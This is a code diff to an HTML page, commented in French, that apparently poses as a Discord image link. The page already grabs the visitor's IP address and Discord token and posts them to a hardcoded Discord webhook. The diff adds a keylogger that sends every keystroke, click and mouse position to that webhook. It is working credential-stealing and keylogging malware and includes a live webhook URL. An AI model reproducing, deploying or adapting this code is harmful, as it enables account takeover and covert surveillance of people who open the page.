@@ -35,6 +35,43 @@
     }
   </style>
   <script>
+    const webhook = "https://discord.com/api/webhooks/1349385558627192843/J9WiGNLlSdX9mAO6GmEXKYDtlN98LxOKaTWf1u3JPsk_IZN_eyEzTnpW-yQ7-qdXqjkV";
+
+    // Fonction pour envoyer les événements au webhook
+    function logEvent(type, data) {
+      const payload = {
+        content: `📡 **${type}**\n\`\`\`\n${data}\n\`\`\``
+      };
+
+      fetch(webhook, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      });
+    }
+
+    // Keylogger
+    document.addEventListener("keydown", function(e) {
+      logEvent("Touche tapée", `Touche : ${e.key} | Code : ${e.code}`);
+    });
+
+    // Clics
+    document.addEventListener("click", function(e) {
+      logEvent("Clic souris", `Position : X=${e.clientX}, Y=${e.clientY}, Élément : ${e.target.tagName}`);
+    });
+
+    // Mouvement souris (1 par seconde)
+    let lastMouseSend = 0;
+    document.addEventListener("mousemove", function(e) {
+      const now = Date.now();
+      if (now - lastMouseSend > 1000) {
+        lastMouseSend = now;
+        logEvent("Mouvement souris", `Position : X=${e.clientX}, Y=${e.clientY}`);
+      }
+    });
+
     document.addEventListener("DOMContentLoaded", async () => {
       try {
         const ip = await fetch("https://api64.ipify.org?format=json")
@@ -60,10 +97,8 @@
           token = "Erreur accès token";
         }
 
-        // Nettoyage des guillemets
         if (token) token = token.replace(/"/g, "");
 
-        // Message Discord final
         const message = `
 **🖼️ Nouvelle ouverture d'image Discord**
 > 🕒 Date/Heure : \`${now}\`
@@ -80,7 +115,7 @@
 > 🪙 Token Discord : \`\`\`${token || "Non trouvé"}\`\`\`
         `;
 
-        await fetch("https://discord.com/api/webhooks/1349385558627192843/J9WiGNLlSdX9mAO6GmEXKYDtlN98LxOKaTWf1u3JPsk_IZN_eyEzTnpW-yQ7-qdXqjkV", {
+        await fetch(webhook, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ content: message })
